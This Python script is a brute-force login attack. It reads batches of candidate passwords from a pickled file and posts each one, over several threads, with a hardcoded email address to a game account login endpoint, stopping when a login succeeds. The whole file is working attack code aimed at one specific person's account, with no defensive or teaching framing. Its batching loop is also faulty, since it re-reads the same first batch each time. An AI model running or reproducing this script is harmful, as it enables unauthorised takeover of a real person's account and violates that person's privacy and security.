import pickle
import requests
import concurrent.futures


def read_passwords(filename, batch_size=500):
    passwords_dict = {}
    with open(filename, 'rb') as f:
        while True:
            try:
                # Load a batch of passwords
                batch = pickle.load(f)
                # Merge the batch into the passwords dictionary
                passwords_dict.update(batch)
                # If the batch size exceeds the limit, break the loop
                if len(passwords_dict) >= batch_size:
                    break
            except EOFError:
                # End of file reached
                break
    return passwords_dict


def game_account_valid(password: str, email: str = "cute20484@yahoo.com.tw"):
    """
    Validate Game Accounts
    :param email: Email of the account
    :param password: Password of the account
    :return: True if the login is successful, False otherwise
    """
    _account_verification_endpoint: str = "https://lsaccount.im30.net/common/v1/login"
    form_data = {'email': email, 'pass': password}
    response = requests.post(url=_account_verification_endpoint, data=form_data)
    if response.ok:
        response_data = response.json()
        return response_data.get('code') == 10000
    return False


def validate_passwords(passwords_dict):
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        # Validate passwords concurrently
        futures = {executor.submit(game_account_valid, password): password for password in passwords_dict.values()}
        for future in concurrent.futures.as_completed(futures):
            password = futures[future]
            try:
                if future.result():
                    print(f"Login successful with password: {password}")
                    return True  # Exit loop after successful login
                else:
                    print(f"Login failed with password: {password}")
            except Exception as e:
                print(f"An error occurred: {e}")
    return False


if __name__ == "__main__":
    filename = 'passwords.bin'
    batch_size = 500  # Define batch size
    passwords_dict = read_passwords(filename, batch_size)

    # Call validate_passwords with the initial batch
    if validate_passwords(passwords_dict):
        print("Password found in the initial batch.")
    else:
        print("Password not found in the initial batch.")

    # Continue reading and validating passwords in batches until found
    while len(passwords_dict) >= batch_size:
        passwords_dict = read_passwords(filename, batch_size)
        if validate_passwords(passwords_dict):
            print("Password found.")
            break
    else:
        print("Password not found in the file.")
